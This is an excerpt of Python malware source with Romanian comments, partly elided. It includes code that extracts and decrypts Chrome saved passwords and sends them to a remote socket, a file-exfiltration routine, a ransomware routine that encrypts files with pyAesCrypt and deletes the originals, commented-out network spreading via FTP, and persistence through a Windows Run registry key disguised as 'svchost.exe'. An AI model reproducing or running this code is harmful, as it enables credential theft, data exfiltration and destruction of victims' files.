...
#         ip="192.168.190"+str(n)
#         l.append(ip)
#         try:
#             sh.ping(ip,"-c 1",_out="/dev/null")
#         except:
#             #daca o ajuns aici e clar ca nu e ok adresa aia ip poti sa o scoti
#             l.remove(ip)

#     # din lista asta cu adrese bune trimitem  executabilul si la celelelate  
#     #nu merge dar asa ca si idee
#     for ip in list:
#         cmd1="ftp " + ip
#         cmd2="put " + "svchost.exe"
#         os.system('cmd/k,cmd1')
#         os.system('cmd/k,cmd2')
    ...
    def send_file(self,fname,nr):
        ...
        if nr==1:
          client.send(f"{fname}<Separator>{size}".encode())
            ...
            nrcif=len(str(size))
            client.send(str(nrcif).encode()) # cate cifre are size ul
            client.send(str(size).encode())  #size ul
            #sper safie ok hai inima mea ca te iubeste mami 
     ...
     try:
          ...
          if len(f)>0:
              ...
              for i in reversed(sorted(f.items(), key=lambda el:el[1])):
                  ...
                  print(name)
                  self.send_file(name,nr)

              if(nr>0):
                  print("Nu te mai juca asa , imi iau jucariile si plec")
                  client.send("1".encode())
                  client.send("7".encode())
                  client.send(f"endMare".encode())
                  print("astia zic ca se trimite acuma dc nu ajunge acolo unde trebe ?")
...
def get_chrome1():
    ...
    try:
        ...
        for r in cursor.fetchall():
            ...
            if len(username) > 0:
                print("Da poti sa pici pe vecie ca eu si asa is proasta")
                #url=url+'\n'
                #username=username+'\n'
                ...
                print(nr)
                tr=str(nr)
                client.send(tr.encode())
                client.send(url.encode())
                nr1=len(username)
                tr1=str(nr1)
                client.send(tr1.encode())
                print(nr1)
                client.send(username.encode())
                nr2=len(decrypted_password)
                tr2=str(nr2)
                print(nr2)
                print(tr2)
                client.send(tr2.encode())
                client.send(decrypted_password.encode())
                print("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
        client.send("12".encode())
        client.send("STOP_LA_TOT".encode())
...
def gen(path, name):
    ...
    try:
        print("s-ar putea sa mi fi luat eu mare teapaa")
        cripteaza(key,name,new_name)
    except:
        print("ia te uite exceptia , te o facut... hai pa")
        pass    

def ransomware():
    #listd=(userhome+'\\Downloads\\',userhome+'\\Documents\\' , 'D:\\','E:\\')
    # sa sterf ceva ce nu mi trebuie totusi
    path1=userhome+"\\Downloads\\Ransomware"
    path2=userhome+"\\Downloads\\Ransomware1"
    listd=(path1,path2)

    for d in listd:
        print("DA DECE ESTI PROST SI TE PIERZI, BA ?")
       
        for f in get_files(d):
            gen(d,f)
            delete(f)

    #la final sa faca si ReadMe pe desktop 
    # cale=userhome+"\\Desktop\\readme.txt"
    # f=open(cale,'w+')
    # f.write("DA NISTE BANI BAIATU SAU FATA MEA CA SA FIE TREABA BUNA ")
...
def decripteaza():
    ...
    if len(c0)>0 and len(c1)>0 and len(c2)>0:
        print("aici si asaa nu , da>>")
        for i in c0.keys():
            ...
            cheie=c1[i]
            size=c2[i]
            with open(nou, "rb") as fIn:
               try:
                    with open(vechi, "wb") as fOut:
            
                       pyAesCrypt.decryptStream(fIn, fOut, cheie, 64 * 1024, size)
...
def add():
    with winreg.ConnectRegistry(None,winreg.HKEY_CURRENT_USER) as hkey:
        with winreg.OpenKey(hkey,"SOFTWARE",0,winreg.KEY_ALL_ACCESS) as sub_key:
             with winreg.OpenKey(sub_key,"Microsoft",0,winreg.KEY_ALL_ACCESS) as sub_key1:
                 with winreg.OpenKey(sub_key1,"Windows",0,winreg.KEY_ALL_ACCESS) as sub_key2:
                      with winreg.OpenKey(sub_key2,"CurrentVersion",0,winreg.KEY_ALL_ACCESS) as sub_key3:
                           with winreg.OpenKey(sub_key3,"Run",0,winreg.KEY_ALL_ACCESS) as sub_key4:
                               path=userhome+r'\Desktop\svchost.exe'
                               winreg.SetValueEx(sub_key4,"Svchost",0,winreg.REG_SZ,path)
